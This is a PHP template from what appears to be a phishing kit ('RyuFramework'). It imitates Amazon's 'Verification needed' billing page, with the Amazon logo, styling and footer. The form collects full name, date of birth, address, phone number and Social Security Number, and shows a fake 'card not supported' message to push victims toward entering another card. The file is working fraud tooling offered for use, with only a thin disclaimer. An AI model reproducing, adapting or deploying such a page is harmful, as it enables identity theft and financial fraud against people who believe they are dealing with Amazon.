<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:24 )
* @filename billing.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
?>
<!doctype html>
<html lang="<?=$this->lang;?>">
<?=$this->sec->keymani();?>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8">
    <title dir="ltr"><?=translate('Amazon Billing Address',$this->lang,1);?></title>
     <meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" /> 
<script type="text/javascript" src="assets/js/jquery.min.js"></script>  
 <script type="text/javascript" src="assets/js/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="assets/js/jquery.payment.min.js"></script>
    <script type="text/javascript" src="assets/js/custom.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.7/css/select2.min.css" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.7/js/select2.min.js"></script>
<script type="text/javascript">
    $(document).ready(function()
    {
        $('#nara').select2();

    });
    function kontol(){
        var country = $('#nara').val();
        window.location.href='?p=billing&session_id=<?=$this->handler->session('session_id');?>&lang=<?=$this->lang;?>&country='+country;
    }
</script>
<link rel="stylesheet" type="text/css" href="assets/css/amz-d.css">
<link rel="stylesheet" type="text/css" href="assets/css/details.css">

</head>
  <body>
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
<div class="a-section a-spacing-medium a-text-center">
      <center><img src="<?=$this->sec->image_encode('assets/img/'.CONFIG['amz']['amz_logo']);?>" onContextMenu="return false;"></center>
      <center><img src="<?=$this->sec->image_encode('assets/img/'.CONFIG['amz']['step_logo']);?>" onContextMenu="return false;"></center>
</div>
      </div>
      <div class="a-section">
<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section"> 

<form method="post" action="<?=$this->form_action_page('billing');?>" class="auth-validate-form a-spacing-none">
   <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            <?=translate('Verification needed',$this->lang);?>
          </h1>
<?php
if(isset($_SESSION['double_card_page'])){
echo "<font color=red>".translate('Your card is not supported. Please use a different card.', $this->lang)."</font>";
}else{
echo translate('Please enter your billing address to verify your account.',$this->lang);
}
?>
  <br/><br/>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('Full name',$this->lang);?> : 
            </label>
            <input type="text" required="required" maxlength="128"  name="nm" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
           <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('Date Of Birth',$this->lang);?> : 
            </label>
            <input type="text" required="required" maxlength="128"  name="dob" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" id="dob">
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('Address',$this->lang);?>  : 
            </label>
            <input type="text" required="required" maxlength="128"  name="aat1" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('City',$this->lang);?> : 
            </label>
            <input type="text" required="required" maxlength="128"  name="kta" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('State/Province/Region',$this->lang);?> : 
            </label>
            <input type="text" required="required" maxlength="128"  name="pnsi" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('ZIP/Postcode',$this->lang);?> : 
            </label>
            <input type="text" required="required" maxlength="128"  name="kpos" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
<?=translate('Country',$this->lang);?> : 
            </label>
            
          </div>
          <select name="nara" class="enterAddressFormField" required="required" id="nara" onchange="kontol();">
            <?php
            
            foreach($this->locale->country_code as $code=>$name)
            {
                if(strtolower(@$_GET['country']) == strtolower($code))
                {
                    echo "<option value='$code' selected>$name</option>";
                }else{
                    echo "<option value='$code'>$name</option>";
                }
            }
            ?>

</select>
<br/>
<?=$this->sec->keymani();?>
<br/>
<div id="enterAddressPhoneNumberContainer" class="a-row a-spacing-base one-new-address-form-field   ">
      <div class="a-span12" data-testid="">

        <label for="nomo" class="">
          <b><?=translate('Phone number',$this->lang);?> :&nbsp;</b>
            <span class="learn-more">(<a data-action="a-popover" class="a-declarative" data-a-popover="{&quot;type&quot;:&quot;html&quot;, &quot;header&quot;: &quot;<b>Phone number:&nbsp;</b>&quot;, &quot;content&quot;: &quot;May be printed on label to assist delivery.&quot;, &quot;position&quot;: &quot;triggerRight&quot;, &quot;alone&quot;: false, &quot;name&quot;:&quot;&quot;}" data-testid="">Learn more</a>)</span>
        </label>
        


<input type="tel" name="nomo" id="nomo" class="enterAddressFormField" size="37" maxlength="20">

      </div>
    </div>

   <div class="a-row a-spacing-base">
            <label for="ml">
Social Security Number : 
            </label>
            <input type="text" required="required"  id="ssn"  name="ssn" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>

<hr>
          <div class="a-section a-spacing-extra-large">
            <span class="a-button a-button-span12 a-button-primary" role="button"><span class="a-button-inner"><input id="btn_bills" tabindex="5" class="a-button-input" type="submit"><span class="a-button-text" aria-hidden="true">
              <?=translate('Next Step',$this->lang);?>
            </span></span></span>
          </div>
             
          
        </div></div>
      </div>
      
    </form>
  </div>
<?=$this->sec->keymani();?>
</div>
      </div>
      <div id="right-2">
      </div>
      <center>
                <p><a href="#"><?=translate('Help',$this->lang);?></a> | <a href="#"><?=translate('Condition of Use',$this->lang);?></a> | <a href="#"><?=translate('Privacy Notice',$this->lang);?></a></p><br>
                <p>&copy; 1996 - <?php echo date('Y'); ?> <?=CONFIG['amz']['domain'];?>, Inc. or its affiliates</p>
            </center>
    </div>
    </div>
  </div>
</body>
</html>

